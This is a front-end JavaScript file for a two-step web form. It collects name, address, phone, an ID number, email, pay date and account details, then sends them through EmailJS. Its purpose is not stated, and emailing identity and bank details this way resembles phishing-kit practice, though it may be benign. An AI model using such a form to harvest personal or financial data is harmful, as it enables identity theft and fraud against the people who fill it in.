document.getElementById("submit-button").addEventListener("click", function() {
    event.preventDefault()
    // Get references to all required input elements
    const inputs = [
        document.getElementById("fname"),
        document.getElementById("address"),
        document.getElementById("phoneNumber"),
        document.getElementById("date"),
        document.getElementById("IDNumber"),
        document.getElementById("email")
    ];

    // Check if all inputs have a value
    let allFilled = true;
    inputs.forEach(input => {
        if (!input.value) {
            allFilled = false;
            input.style.border = "1px solid red"; // Highlight empty fields
            let error = document.createElement('span');
            error.className = 'error-message';
            error.innerText = "This field is required";
            error.style.marginBottom = '5%'
            input.parentNode.insertBefore(error, input.nextSibling); // Add error message
        } else {
            input.style.border = ""; // Reset border if filled
        }
    });

        // Validate email format
const emailInput = document.getElementById("email");
const emailValue = emailInput.value;
if (emailValue && !emailValue.includes('@')) {
alert("Please enter a valid email address with '@'.");
emailInput.style.border = "1px solid red";
allFilled = false;
}


    // Proceed to next page if all fields are filled
    if (allFilled) {
       let firstForm = document.getElementById('first-form')
       let secondForm = document.getElementById('second-form')
       firstForm.style.display = 'none'
       secondForm.style.display = 'block'
       secondForm.style.marginTop = '1%'
    } else {
        alert("Please fill in all fields before proceeding.");
    }
});

const secondInputs = [
    document.getElementById('payDate'),
    document.getElementById('reason'),
    document.getElementById('accountDetails'),
  
];
let allFilled = false;
// Add an input event listener to each input
secondInputs.forEach(input => {
    input.addEventListener('input', () => {
        checkInputs(); // Call the function to check all input values
    });
});
function checkInputs() {
    allFilled = secondInputs.every(input => input.value.trim() !== "");
    document.getElementById('submitButton').disabled = !allFilled;
}

// Ensure that the required attributes are properly set before submission
window.onload = function(){

    document.getElementById('contact-form').addEventListener('submit', function(event) {
        // updateRequiredAttributes(); // Update required fields based on visibility
        
        event.preventDefault(); // Prevent default submission
        
        // Set a random contact number and send the email
        this.contact_number.value = Math.random() * 100000 | 0;
          let form = document.getElementById("contact-form")
        form.style.display = 'none'
        
        emailjs.sendForm("service_gg0hydp", "template_0kd6ue6", this)
        .then(function() {
            console.log('SUCCESS!');
            let successful = document.getElementById("successful")
            setTimeout(sub, 400);
            function sub(){
            successful.style.display = "block"
            }
        }, function(error) {
                console.log('FAILED...', error);
                // let subscribe = document.getElementById('submit')
                // subscribe.value = 'unable to submit'
                // subscribe.style.animationName = 'failed';
                setTimeout(sub, 800);
                function sub(){
                    // let writng = document.getElementById('write-up');
                    let form = document.getElementById("contact-form")
                    // writng.style.display = 'block'
                    // writng.style.color = 'black'
                    form.style.display = 'none'
                    // terms.style.display = 'none'
                }
        });
    });
}

